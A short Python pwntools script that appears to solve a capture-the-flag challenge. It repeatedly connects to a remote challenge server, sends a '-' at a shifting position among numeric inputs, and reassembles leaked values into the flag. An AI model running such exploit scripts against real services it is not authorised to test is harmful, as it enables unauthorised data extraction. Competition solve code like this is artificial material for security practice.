#!/usr/bin/env python3
from pwn import *
import struct

flag = b''

for i in range(4, 18):
    r = remote('0.cloud.chals.io', 10198)

    for j in range(20):
        r.sendlineafter(b':\n', b'-' if i == j else b'0')

    r.recvuntil(b'is ')
    flag += struct.pack('i', int(float(r.recvline()[:-2].decode()) * 20))

print(flag)
